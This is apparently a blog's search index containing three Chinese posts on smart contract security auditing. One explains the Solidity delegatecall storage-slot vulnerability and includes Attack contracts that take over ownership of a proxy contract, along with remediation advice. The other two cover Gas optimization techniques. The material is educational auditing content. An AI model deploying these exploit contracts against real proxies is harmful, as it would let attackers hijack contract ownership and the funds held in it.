<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Delegatecall漏洞</title>
    <url>/2024/09/05/1/</url>
    <content><![CDATA[<h3 id="call-和-delegatecall-的区别"><a href="#call-和-delegatecall-的区别" class="headerlink" title="call 和 delegatecall 的区别"></a>call 和 delegatecall 的区别</h3><ul>
<li>call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境；</li>
<li>delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；</li>
</ul>
<p><strong>call</strong></p>

<p>当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。</p>
<p><strong>delegatecall</strong></p>

<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
<p>另外，当使用 delegatecall 函数进行外部调用涉及到 storage 变量的修改时是根据插槽位置来修改的而不是变量名。如下代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public c;</span><br><span class="line">    address public a;</span><br><span class="line"></span><br><span class="line">    function test() public returns (address b)&#123;</span><br><span class="line">        b = address(this);</span><br><span class="line">        a = b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;</span><br><span class="line">    address public c;</span><br><span class="line"></span><br><span class="line">    address Aaddress ;</span><br><span class="line"></span><br><span class="line">    constructor(address _Aaddress) &#123;</span><br><span class="line">        Aaddress = _Aaddress;   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegatecall() public&#123;</span><br><span class="line">        Aaddress.delegatecall(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>A 合约中 address c 存储在 slot0 中，address a 存储在 slot1 中，反之在 B 合约中 address a 存储在 slot0 中，address c 存储在 slot1 中。当我们通过调用 B 合约中的 delegatecall 函数调用 A 合约中的 test 函数时，test 函数修改的是 A 合约中 slot1 这个插槽，所以代码运行的结果是 B 合约中的 address c 被修改了，因为在 B 合约中的 slot1 对应的正是 address c 这个地址存储的位置。</p>
<h3 id="delegatecall-漏洞"><a href="#delegatecall-漏洞" class="headerlink" title="delegatecall 漏洞"></a>delegatecall 漏洞</h3><p>也叫代理合约所有者操纵漏洞，该漏洞允许攻击者操纵代理合约的所有者（下文中B合约为代理合约）。</p>
<p>以下代码中，可以看到有两个合约，A 合约中通过 test() 函数用来修改合约的 owner，在 B 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 A 合约中的函数。我们通过 Attack 合约，利用 B.fallback() 触发 delegatecall 函数去调用 A.test() 将 B 合约中的 owner 改成 Attack 合约，从而控制 B 合约。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;   // 这里方便演示漏洞效果使用public，实际中会有权限校验。</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    A public a;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        a = A(_a);   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external  &#123;</span><br><span class="line">        address(a).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = _b;    // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.call(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="delegatecall-漏洞进阶版"><a href="#delegatecall-漏洞进阶版" class="headerlink" title="delegatecall 漏洞进阶版"></a>delegatecall 漏洞进阶版</h3><p>先看代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;   // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _a) &#123;</span><br><span class="line">        a = _a;    // 传入A合约的地址</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        a.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;  // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(B _b) &#123;</span><br><span class="line">        b = B(_b);   // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.doSomething(uint(uint160(address(this))));   // 第一次调用替换B合约中的a地址为当前合约地址</span><br><span class="line">        b.doSomething(1);      // 第二次调用当前合约的doSomething()函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>攻击流程：</p>
<ul>
<li>用户 部署 A 合约；</li>
<li>用户 部署 B 合约并在构造函数中传入 A 合约的地址；</li>
<li>攻击者 部署 Attack 合约并在构造函数中传入 B 合约的地址；</li>
<li>攻击者调用 Attack.attack() 函数将 B 合约中的 owner 变为自己。</li>
</ul>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
</ul>
]]></content>
      <tags>
        <tag>智能合约安全审计</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Gas优化（一）</title>
    <url>/2024/04/12/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>以太坊网络上的每个操作，从简单的转账到复杂的合约交互，都需要消耗Gas。Gas机制不仅防止了网络资源的滥用，还通过设置交易的 Gas Limit 确保每个操作计算资源使用在合理范围内，从而保障网络的安全性和稳定性。</p>
<h2 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h2><h3 id="减少存储变量的读取"><a href="#减少存储变量的读取" class="headerlink" title="减少存储变量的读取"></a>减少存储变量的读取</h3><p>读取存储变量至少需要100gas（在EVM中，每次第一次访问任何存储变量时都必须付费，这称为“冷”访问，需要花费2100个gas。第二次或连续一次被称为“热”访问，需要花费 100 Gas。），因为Solidity不会缓存存储读取。<br>如下例子中存储变量<code>_decimalsETH</code>被重复读取</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getTokensFromUSD(</span><br><span class="line">    address _tokenAddress,</span><br><span class="line">    uint256 _usdValue</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    uint8 tokenDecimals = _tokenDecimals[</span><br><span class="line">        _tokenAddress</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    return _decimalsETH &lt; tokenDecimals     //第一次</span><br><span class="line">        ? _usdValue</span><br><span class="line">            * 10 ** (tokenDecimals - _decimalsETH)   //第二次</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">        : _usdValue</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">            / 10 ** (_decimalsETH - tokenDecimals);   //第二次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>采用临时变量来缓存存储变量节省gas。</p>
<h3 id="使用存储指针"><a href="#使用存储指针" class="headerlink" title="使用存储指针"></a>使用存储指针</h3><p>将整个结构体从存储中复制到内存中，包含了不需要的变量。而使用存储指针，通过引用传递只进行一次存储加载而不需要再从内存复制回存储中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseReservedForCompound(</span><br><span class="line">    address _pendleMarket,</span><br><span class="line">    uint256[] calldata _amounts</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyChildContract(_pendleMarket)</span><br><span class="line">&#123;</span><br><span class="line">    CompoundStruct memory childInfo = pendleChildCompoundInfo[</span><br><span class="line">        _pendleMarket</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 length = childInfo.rewardTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; length) &#123;</span><br><span class="line">        childInfo.reservedForCompound[i] += _amounts[i];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pendleChildCompoundInfo[_pendleMarket] = childInfo;</span><br><span class="line"></span><br><span class="line">    emit IncreaseReservedForCompound(</span><br><span class="line">        _pendleMarket,</span><br><span class="line">        _amounts</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将<code>memery</code>改为<code>storage </code>，并删除<code>pendleChildCompoundInfo[_pendleMarket] = childInfo;</code>.</p>
<h3 id="减少0值写入"><a href="#减少0值写入" class="headerlink" title="减少0值写入"></a>减少0值写入</h3><p>在存储变量做计算赋值时，应避免0的计算。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseIncentiveA(</span><br><span class="line">    uint256 _value</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyIncentiveMaster</span><br><span class="line">&#123;</span><br><span class="line">    incentiveUSD[incentiveOwnerA] += _value;</span><br><span class="line"></span><br><span class="line">    emit IncentiveIncreasedA(</span><br><span class="line">        _value,</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>_value</code>如果为0，<code>incentiveUSD[incentiveOwnerA]</code>并没有发生变化，可以不进行加法运算，减少存储变量的读写操作。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error ZeroValue();</span><br><span class="line">if(_value == 0) &#123;</span><br><span class="line">    revert ZeroValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>先<code>_value</code>判断是否为0，再进行加法操作。</p>
<h3 id="只读参数使用calldata比memory便宜"><a href="#只读参数使用calldata比memory便宜" class="headerlink" title="只读参数使用calldata比memory便宜"></a>只读参数使用calldata比memory便宜</h3><p>直接从calldata中加载函数输入或数据比从内存中加载更便宜，因为从calldata访问数据涉及的操作和gas成本较少。因此，建议仅在函数需要修改数据时使用memory（calldata无法修改）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setBaseURI(</span><br><span class="line">    string memory _newBaseURI   // 用calldata代替memory</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    baseURI = _newBaseURI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="变量优化"><a href="#变量优化" class="headerlink" title="变量优化"></a>变量优化</h2><p>Solidity中使用连续的插槽（32字节slot）来存储变量。当存储变量远小于32字节时，可以将多个32字节的存储变量打包到同一个插槽中优化gas使用。如果我们试图打包的变量超过当前槽的32字节限制，它将被存储在一个新的插槽中。<br><strong>值类型：</strong><br>整型(int&#x2F;uint)   uint256 32字节      (另外，enum枚举类型会被编译器自动转换成uint8类型)<br>地址类型(address)  address 20字节<br>布尔类型(bool)    bool 1字节<br>字节类型(byte)  bytes1 bytes2 bytes3 … bytes32  1~32字节<br>定长数组(uint[3],byte[2]..),  字节大小根据实际长度计算</p>
<p>映射和动态数组的大小是不可预知的，它们本身只占32个字节，它们所包含的元素被存储在不同的存储槽，该存储槽是用Keccak-256哈希计算而来。<br><strong>引用类型：</strong>（占用字节数需要具体计算）<br>动态数组(uint[], byte[], string, address[]…)<br>映射(mapping)<br>结构体(struct) </p>
<h3 id="打包存储变量"><a href="#打包存储变量" class="headerlink" title="打包存储变量"></a>打包存储变量</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">uint256 public totalDebt;</span><br><span class="line">bool public strategyActive;</span><br></pre></td></tr></table></figure></div>
<p>由于以上布局会使用3个插槽，调整布局进行变量打包，会把strategyActive和pool打包到1个插槽里，从而节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">bool public strategyActive;</span><br><span class="line">uint256 public totalDebt;</span><br></pre></td></tr></table></figure></div>
<p>打包后，会使用2个插槽。</p>
<h3 id="打包结构体成员变量"><a href="#打包结构体成员变量" class="headerlink" title="打包结构体成员变量"></a>打包结构体成员变量</h3><p>在Solidity中，结构体成员从初始化的槽位置开始按顺序存储在合约的存储中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123; //  can be tightly packed by moving borrowType and liquidatable at the end</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    BorrowType borrowType; //  1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //   1 byte</span><br><span class="line">    uint256 liquidatedAt; // 32 bytes</span><br><span class="line">    address liquidator; // 20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>打包成员变量，可以节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    uint256 liquidatedAt; //  32 bytes</span><br><span class="line">    BorrowType borrowType; // 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //  1 byte</span><br><span class="line">    address liquidator; //  20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>




<h2 id="函数优化"><a href="#函数优化" class="headerlink" title="函数优化"></a>函数优化</h2><h3 id="使用函数命名式-returns-返回值"><a href="#使用函数命名式-returns-返回值" class="headerlink" title="使用函数命名式(returns)返回值"></a>使用函数命名式(returns)返回值</h3><p>Solidity中两个关键字：<code>return</code>和<code>returns</code>，区别是：</p>
<ul>
<li><code>return</code>: 在函数主体中，用于返回指定的变量；</li>
<li><code>returns</code>: 加在函数名后面，用于生命返回的变量类型及变量名。</li>
</ul>
<p>在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。每个变量可以节省9gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TestContract  &#123;</span><br><span class="line">    function NoNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256) </span><br><span class="line">    &#123;</span><br><span class="line">        uint256 sum;</span><br><span class="line"></span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function UsingNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256 sum) </span><br><span class="line">    &#123;</span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="合并仅调用一次的internal函数"><a href="#合并仅调用一次的internal函数" class="headerlink" title="合并仅调用一次的internal函数"></a>合并仅调用一次的internal函数</h3><p>当某个被调用函数仅调用一次时，可以重构并合并到调用函数当中，函数调用会增加额外的堆栈和JUMP指令等开销。<br><strong>注：这可能会影响代码原有结构，适用于代码量少的函数，慎用。</strong></p>
<h2 id="修饰符优化"><a href="#修饰符优化" class="headerlink" title="修饰符优化"></a>修饰符优化</h2><h3 id="选择合适的变量可见性"><a href="#选择合适的变量可见性" class="headerlink" title="选择合适的变量可见性"></a>选择合适的变量可见性</h3><p>避免使用公共变量（public），公共变量隐式创建一个getter函数，这可能会增加合约的大小和Gas使用。</p>
<p>父合约<code>contracts/WiseLendingDeclaration.sol</code>定义存储变量：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) public positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
<p>子合约<code>contracts/WiseLowLevelHelper.sol</code>使用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPositionLendingTokenByIndex(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _index</span><br><span class="line">)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (address)</span><br><span class="line">&#123;</span><br><span class="line">    return positionLendTokenData[_nftId][_index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将<code>public</code>修饰符改为<code>internal</code>：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) internal positionLendTokenData;</span><br></pre></td></tr></table></figure></div>

<h3 id="使用-payable-函数"><a href="#使用-payable-函数" class="headerlink" title="使用 payable 函数"></a>使用 payable 函数</h3><p>payable函数比非payable函数消耗更少的gas，因为payable函数允许用户在调用函数时传递非0或0ETH，而不需要检查ETH转账。<br><strong>注：虽然节省gas很重要，如果一个函数与接收ETH无关，即使能节省gas也不应附加任何payable修饰符。</strong></p>
<h2 id="编译器优化"><a href="#编译器优化" class="headerlink" title="编译器优化"></a>编译器优化</h2><h3 id="unchecked除法"><a href="#unchecked除法" class="headerlink" title="unchecked除法"></a>unchecked除法</h3><p>从 Solidity 0.8.0 版本开始，所有的算术运算默认就会进行溢出检查。Unchecked 代码块，提示编译器不安全地执行算术操作。前提是保证 unchecked 代码块中的内容能够安全的执行，从而可以节省Gas成本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant ONE_WEEK = 7 days;</span><br><span class="line">function previewDistribution()</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    if (totalLpAssetsToDistribute == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (block.timestamp == lastInteraction) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (totalLpAssetsToDistribute &lt; ONE_WEEK) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 currentRate = totalLpAssetsToDistribute</span><br><span class="line">        / ONE_WEEK;                      // unckecked</span><br><span class="line"></span><br><span class="line">    uint256 additonalAssets = currentRate</span><br><span class="line">        * (block.timestamp - lastInteraction);</span><br><span class="line"></span><br><span class="line">    if (additonalAssets &gt; totalLpAssetsToDistribute) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return additonalAssets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分母为0或负数的情况，以上代码不需要检查，添加unchecked可以节省Gas。</p>
]]></content>
      <tags>
        <tag>智能合约安全审计</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>GAS优化（二）</title>
    <url>/2024/08/19/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="逻辑优化"><a href="#逻辑优化" class="headerlink" title="逻辑优化"></a>逻辑优化</h2><h3 id="简化代码实现逻辑"><a href="#简化代码实现逻辑" class="headerlink" title="简化代码实现逻辑"></a>简化代码实现逻辑</h3><ul>
<li><p>结合代码上下文，对于可预测的执行结果，没有必要通过代码进行计算，可以进行简化代码，从而节省gas。<br>如以下代码就可以直接设置 num 变量的值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function constantOutcome() public pure returns (uint256) &#123;</span><br><span class="line">    uint256 num = 0;</span><br><span class="line">    for (uint256 i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">        num += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    return num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>当存储变量更新为address(0)时，可直接使用address(0)而不是去读取该存储变量（<strong>此处可能影响代码可读性</strong>）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address private _pendingMultiSourceLoanAddress;</span><br><span class="line"></span><br><span class="line">function finalUpdateMultiSourceLoanAddress(address _newAddress) external onlyOwner &#123;</span><br><span class="line">    if (_pendingMultiSourceLoanAddress != _newAddress) &#123;</span><br><span class="line">        revert InvalidAddressUpdateError();</span><br><span class="line">    &#125;</span><br><span class="line">    _multiSourceLoan = MultiSourceLoan(_pendingMultiSourceLoanAddress);</span><br><span class="line">    _pendingMultiSourceLoanAddress = address(0);</span><br><span class="line">    emit MultiSourceLoanUpdated(_pendingMultiSourceLoanAddress);  // 可直接使用address(0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>阅读代码实现的上下文，简化实现逻辑以节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _createNewFighter(</span><br><span class="line">    address to, </span><br><span class="line">    uint256 dna, </span><br><span class="line">    string memory modelHash,</span><br><span class="line">    string memory modelType, </span><br><span class="line">    uint8 fighterType,</span><br><span class="line">    uint8 iconsType,</span><br><span class="line">    uint256[2] memory customAttributes</span><br><span class="line">) </span><br><span class="line">    private </span><br><span class="line">&#123;  </span><br><span class="line">    require(balanceOf(to) &lt; MAX_FIGHTERS_ALLOWED);</span><br><span class="line">    uint256 element; </span><br><span class="line">    uint256 weight;</span><br><span class="line">    uint256 newDna;    //根据代码中使用的情况，newDna可以删除重构实现逻辑。</span><br><span class="line">    if (customAttributes[0] == 100) &#123;</span><br><span class="line">        (element, weight, newDna) = _createFighterBase(dna, fighterType); // 生成賦值newDna</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        element = customAttributes[0];</span><br><span class="line">        weight = customAttributes[1];</span><br><span class="line">        newDna = dna;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 newId = fighters.length;</span><br><span class="line"></span><br><span class="line">    bool dendroidBool = fighterType == 1;   </span><br><span class="line">    FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(</span><br><span class="line">        newDna,      //本函数后续代码中，未使用newDna</span><br><span class="line">        generation[fighterType],</span><br><span class="line">        iconsType,</span><br><span class="line">        dendroidBool   // 值为1，导致createPhysicalAttributes()中未真实使用newDna</span><br><span class="line">    );</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createPhysicalAttributes(</span><br><span class="line">    uint256 dna, </span><br><span class="line">    uint8 generation, </span><br><span class="line">    uint8 iconsType, </span><br><span class="line">    bool dendroidBool</span><br><span class="line">) </span><br><span class="line">    external </span><br><span class="line">    view </span><br><span class="line">    returns (FighterOps.FighterPhysicalAttributes memory) </span><br><span class="line">&#123;</span><br><span class="line">    if (dendroidBool) &#123;  //函数进入当前代码块，当前条件中未使用dna</span><br><span class="line">        return FighterOps.FighterPhysicalAttributes(99, 99, 99, 99, 99, 99);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ...  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _createFighterBase(</span><br><span class="line">    uint256 dna, </span><br><span class="line">    uint8 fighterType</span><br><span class="line">) </span><br><span class="line">    private </span><br><span class="line">    view </span><br><span class="line">    returns (uint256, uint256, uint256) </span><br><span class="line">&#123;</span><br><span class="line">    uint256 element = dna % numElements[generation[fighterType]];</span><br><span class="line">    uint256 weight = dna % 31 + 65;</span><br><span class="line">    uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);   // 此处赋值newDna</span><br><span class="line">    return (element, weight, newDna);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于以上函数_createNewFighter()中，newDna变量并未真实的使用过，所以可以删除此参数的相关处理，createPhysicalAttributes的newDna参数可以使用其它代替(如dna)；</p>
</li>
</ul>
<h3 id="临时变量的检查优先于存储变量"><a href="#临时变量的检查优先于存储变量" class="headerlink" title="临时变量的检查优先于存储变量"></a>临时变量的检查优先于存储变量</h3><p>由于函数内部开始执行正常逻辑前，会有多个判断条件，常量的判断先于存储变量的判断，在不满足判断的条件下可节省gas。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _checkLiquidatorNft(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _nftIdLiquidator</span><br><span class="line">)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">&#123;</span><br><span class="line">    if (positionLocked[_nftIdLiquidator] == true) &#123;</span><br><span class="line">        revert LiquidatorIsInPowerFarm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_nftIdLiquidator == _nftId) &#123;</span><br><span class="line">        revert InvalidLiquidator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_nftIdLiquidator &gt;= POSITION_NFT.getNextExpectedId()) &#123;</span><br><span class="line">        revert InvalidLiquidator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以将判断条件<code>_nftIdLiquidator == _nftId</code>放置函数的最前端。</p>
<h3 id="避免不必要的状态更新"><a href="#避免不必要的状态更新" class="headerlink" title="避免不必要的状态更新"></a>避免不必要的状态更新</h3><p>当频繁更新存储变量的状态时，应先检查是否曾经更新过，否则跳过更新（写入）操作。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setApprovalForAll(address operator, bool approved) public &#123;</span><br><span class="line">    isApprovedForAll[msg.sender][operator] = approved;</span><br><span class="line">    emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后</p>
